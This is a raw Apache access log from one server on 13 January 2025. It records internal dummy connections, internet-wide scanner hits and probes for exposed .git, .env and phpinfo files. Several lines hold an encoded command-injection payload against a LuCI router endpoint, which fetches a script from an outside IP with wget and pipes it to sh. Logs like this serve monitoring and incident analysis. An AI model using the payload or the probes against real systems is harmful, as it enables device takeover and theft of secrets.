::1 - - [13/Jan/2025:03:15:45 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:46 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:47 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:48 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:49 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:50 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:51 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:52 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:53 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:54 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:55 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:56 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:57 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:58 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:15:59 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:00 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:01 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:02 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:03 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:04 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:05 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:06 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:07 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:08 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:09 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:10 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:11 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:12 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:13 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:14 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:15 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:16 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:17 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:18 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:19 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:20 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:21 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:22 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:23 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:24 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:25 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:26 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:27 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:28 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:29 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:30 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:31 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:32 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:33 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:34 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:35 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:36 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:37 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:38 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:39 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:40 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:41 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:42 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:43 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:44 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:45 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:46 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:47 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:48 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:49 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:50 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:51 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:52 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
::1 - - [13/Jan/2025:03:16:53 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
64.226.69.204 - - [13/Jan/2025:04:39:49 +0000] "\x16\x03\x01\x01$\x01" 400 532 "-" "-"
193.34.212.75 - - [13/Jan/2025:04:41:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
179.43.191.146 - - [13/Jan/2025:04:53:54 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.3 - - [13/Jan/2025:04:58:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
210.165.64.208 - - [13/Jan/2025:05:04:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.148.10.242 - - [13/Jan/2025:05:05:11 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [13/Jan/2025:05:10:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.165 - - [13/Jan/2025:05:28:33 +0000] "\x16\x03\x01" 400 532 "-" "-"
205.210.31.165 - - [13/Jan/2025:05:28:33 +0000] "\x16\x03\x01" 400 532 "-" "-"
40.78.95.177 - - [13/Jan/2025:05:35:22 +0000] "MGLNDD_34.48.126.28_80\n" 400 532 "-" "-"
139.162.71.210 - - [13/Jan/2025:05:40:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
185.189.182.234 - - [13/Jan/2025:05:41:30 +0000] "GET / HTTP/1.1" 400 532 "-" "-"
185.16.39.104 - - [13/Jan/2025:06:05:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
91.223.3.201 - - [13/Jan/2025:06:27:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [13/Jan/2025:07:25:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.55.226 - - [13/Jan/2025:07:43:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [13/Jan/2025:07:46:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [13/Jan/2025:07:58:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
93.174.93.12 - - [13/Jan/2025:08:38:08 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
71.6.232.24 - - [13/Jan/2025:08:40:48 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
199.45.154.122 - - [13/Jan/2025:08:54:22 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
199.45.154.122 - - [13/Jan/2025:08:54:27 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.122 - - [13/Jan/2025:08:54:27 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.122 - - [13/Jan/2025:08:54:28 +0000] "GET / HTTP/1.1" 200 966 "http://34.48.126.28/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.122 - - [13/Jan/2025:08:54:28 +0000] "PRI * HTTP/2.0" 400 532 "-" "-"
31.220.1.144 - - [13/Jan/2025:09:24:45 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:09:24:45 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
178.215.236.132 - - [13/Jan/2025:09:45:13 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)"
5.181.190.248 - - [13/Jan/2025:09:53:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
34.19.63.247 - - [13/Jan/2025:09:53:51 +0000] "\x16\x03\x01" 400 532 "-" "-"
34.19.63.247 - - [13/Jan/2025:09:53:53 +0000] "OPTIONS / HTTP/1.0" 200 1761 "-" "-"
193.34.212.75 - - [13/Jan/2025:10:04:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.55.226 - - [13/Jan/2025:10:23:25 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
31.220.1.144 - - [13/Jan/2025:10:24:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:10:24:26 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:10:45:09 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:10:45:09 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
139.162.71.210 - - [13/Jan/2025:11:02:05 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
185.16.39.104 - - [13/Jan/2025:11:20:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
180.12.131.12 - - [13/Jan/2025:11:35:00 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
147.185.133.42 - - [13/Jan/2025:11:51:15 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
109.145.107.195 - - [13/Jan/2025:11:51:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
179.43.191.146 - - [13/Jan/2025:11:57:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [13/Jan/2025:11:58:37 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.115.34 - - [13/Jan/2025:12:19:27 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.9.17"
5.181.190.248 - - [13/Jan/2025:12:19:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
150.255.53.212 - - [13/Jan/2025:12:22:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
211.139.7.7 - - [13/Jan/2025:12:23:37 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
171.34.168.69 - - [13/Jan/2025:12:23:37 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
118.212.122.143 - - [13/Jan/2025:12:23:39 +0000] "GET / HTTP/1.1" 200 1761 "http://34.48.126.28/favicon.ico" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
31.220.1.144 - - [13/Jan/2025:12:29:22 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:12:29:22 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
186.15.26.174 - - [13/Jan/2025:12:43:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
141.94.145.70 - - [13/Jan/2025:12:49:50 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.4.15"
185.242.226.10 - - [13/Jan/2025:12:57:50 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
139.59.101.104 - - [13/Jan/2025:13:06:49 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
95.214.55.226 - - [13/Jan/2025:13:06:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
124.154.243.81 - - [13/Jan/2025:13:35:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
148.113.210.254 - - [13/Jan/2025:13:58:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
193.34.212.75 - - [13/Jan/2025:14:01:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
31.220.1.144 - - [13/Jan/2025:14:33:11 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:14:33:11 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
184.105.139.69 - - [13/Jan/2025:14:53:15 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
181.234.46.131 - - [13/Jan/2025:14:55:11 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
184.105.139.69 - - [13/Jan/2025:14:56:11 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
184.105.139.69 - - [13/Jan/2025:14:57:01 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
31.220.1.144 - - [13/Jan/2025:15:13:07 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:15:13:07 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
18.118.135.178 - - [13/Jan/2025:15:26:12 +0000] "\x16\x03\x01" 400 532 "-" "-"
18.118.135.178 - - [13/Jan/2025:15:26:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
192.155.90.118 - - [13/Jan/2025:15:45:59 +0000] "\x16\x03\x01" 400 532 "-" "-"
108.165.153.32 - - [13/Jan/2025:15:48:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
108.165.153.32 - - [13/Jan/2025:15:48:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
175.134.107.86 - - [13/Jan/2025:16:13:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [13/Jan/2025:16:13:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.146.59 - - [13/Jan/2025:16:37:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.146.59 - - [13/Jan/2025:16:37:47 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.59 - - [13/Jan/2025:16:37:48 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.59 - - [13/Jan/2025:16:37:48 +0000] "GET / HTTP/1.1" 200 966 "http://34.48.126.28/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.59 - - [13/Jan/2025:16:37:48 +0000] "PRI * HTTP/2.0" 400 532 "-" "-"
64.56.22.177 - - [13/Jan/2025:16:39:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.120.115.119 - - [13/Jan/2025:16:42:46 +0000] "GET /.env HTTP/1.1" 302 350 "-" "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
31.220.1.144 - - [13/Jan/2025:16:48:44 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:16:48:44 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
159.223.69.51 - - [13/Jan/2025:16:54:08 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [13/Jan/2025:16:54:36 +0000] "\x16\x03\x01\x01\v\x01" 400 532 "-" "-"
159.223.67.34 - - [13/Jan/2025:16:58:56 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [13/Jan/2025:16:59:03 +0000] "\x16\x03\x01\x01\v\x01" 400 532 "-" "-"
